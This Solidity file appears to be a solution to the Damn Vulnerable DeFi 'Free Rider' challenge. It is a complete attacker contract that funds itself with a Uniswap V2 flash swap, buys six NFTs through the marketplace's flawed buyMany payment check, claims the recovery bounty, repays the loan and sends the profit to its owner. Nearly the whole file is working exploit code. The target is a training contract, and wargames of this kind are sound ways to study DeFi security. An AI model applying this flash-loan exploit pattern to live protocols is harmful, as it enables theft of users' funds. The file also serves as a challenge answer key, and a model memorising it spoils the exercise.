// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderAttacker is IERC721Receiver {
    WETH private weth;
    DamnValuableNFT private nft;
    IUniswapV2Pair private uniswapV2Pair;
    FreeRiderNFTMarketplace private marketplace;
    FreeRiderRecoveryManager private recoveryManager;
    address private owner;

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 private constant NFT_PRICE = 15 ether;
    uint256 private constant AMOUNT_OF_NFTS = 6;

    constructor(
        WETH _weth,
        DamnValuableNFT _nft,
        IUniswapV2Pair _uniswapV2Pair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecoveryManager _recoveryManager
    ) payable {
        weth = _weth;
        nft = _nft;
        uniswapV2Pair = _uniswapV2Pair;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external {
        // attack path => 1. attack() -> 2. flash swap 15 ETH
        // -> 3. buy 6 NFTs with 15 ETH -> 4. transfer NFTs to manager
        // -> 5. repay the uniswapV2Pair 15 ETH + Fee -> transfer ETh to player

        // new bytes(1) will trigger the flash swap functionality in the uniswapV2Pair contract
        // data.length == 0 (standard swap) vs data.length > 0 (flash swap)
        uniswapV2Pair.swap(NFT_PRICE, 0, address(this), new bytes(1));
        // transfer the 45 ETH from attacker to owner (player)
        payable(owner).transfer(address(this).balance);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        /* 
            from uniswapV2 docs - ensure that msg.sender is a V2 pair
            address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
            address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
            assert(msg.sender == IUniswapV2Factory(factoryV2).getPair(token0, token1)); 
        */

        require(
            sender == address(this),
            "The caller of swap is NOT the attacker contract"
        );

        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);

        for (uint i = 0; i < ids.length; ++i) {
            ids[i] = i;
        }

        weth.withdraw(weth.balanceOf(address(this)));
        marketplace.buyMany{value: NFT_PRICE}(ids);

        for (uint i = 0; i < ids.length; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                abi.encodePacked(bytes32(uint256(uint160(owner))))
            );
        }

        uint amountToRepay = amount0 + 1 ether;
        weth.deposit{value: amountToRepay}();
        weth.transfer(msg.sender, amountToRepay);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
